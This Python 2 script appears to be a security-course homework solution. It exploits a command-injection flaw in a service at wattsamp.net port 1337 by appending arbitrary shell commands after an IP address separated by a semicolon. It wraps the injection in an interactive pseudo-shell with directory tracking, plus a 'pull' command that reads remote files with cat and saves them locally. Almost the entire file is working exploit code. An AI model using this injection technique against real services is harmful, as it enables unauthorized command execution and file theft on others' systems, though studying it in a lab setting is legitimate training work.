
"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()
    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "wattsamp.net" # IP address here
port = 1337 # Port here
shell = ">"


def execute_cmd(cmd):
	while (cmd != "quit"):

		if (cmd == "shell"):
			direct = "/"
			path = direct
			cmd = raw_input(direct + shell + " ")
			while (cmd != "exit"):
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))
				data = s.recv(1024)
				if (cmd[0:2] == "cd"):
					d = cmd[3:]
					#s.send("157.230.179.99; ls\n")
					s.send("157.230.179.99; ls " + d + "\n")
					data = s.recv(1024)


					if (len(data.split('\n', 7)[7].replace('\n', ' ')) > 0):
						path = path + d + "/"
						direct = d
					elif (d == '.'):
						path = path
					elif (d == '..'):
						pathTemp = path
						pathTemp.replace("..", "")
						temp = pathTemp.split('/')
						temp[0] = "/"
						direct = temp[len(temp) - 3]

						path = path + d + "/"
					else:
						print("error: " + d + " does not exist\n")
				else:

					s.send("157.230.179.99; cd " + path + "; " + cmd + "\n")
					data = s.recv(1024)     # Receives 1024 bytes from IP/Port

					print(data.split('\n', 7)[7].replace('\n', ' '))
				cmd = raw_input(direct + shell + " ")
		elif (cmd[0:4] == "pull"):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			data = s.recv(1024)
			paths = cmd.split(' ')
			s.send("157.230.179.99; cat " + paths[1] + "\n")
			data = s.recv(1024)
			writeData = data.split('\n', 7)[7].replace('\n', ' ')
			f = open(paths[2], "w+")
			f.write(writeData)
		elif (cmd == "help"):
			print ("1. shell => Drop into an interactive shell and allow users to gracefully exit\n2. pull <remote-path> <local-path> => Download files\n3. help => Shows this help menu\n4. quit => Quit the shell\n")
		elif (cmd == "quit"):
			print("bye!\n")
		else:
			print("error: " + cmd + " is not a command\n")
			print ("1. shell => Drop into an interactive shell and allow users to gracefully exit\n2. pull <remote-path> <local-path> => Download files\n3. help => Shows this help menu\n4. quit => Quit the shell\n")

		cmd = raw_input(shell + " ")





if __name__ == '__main__':
	mydata = raw_input(shell + ' ')
	execute_cmd(mydata)
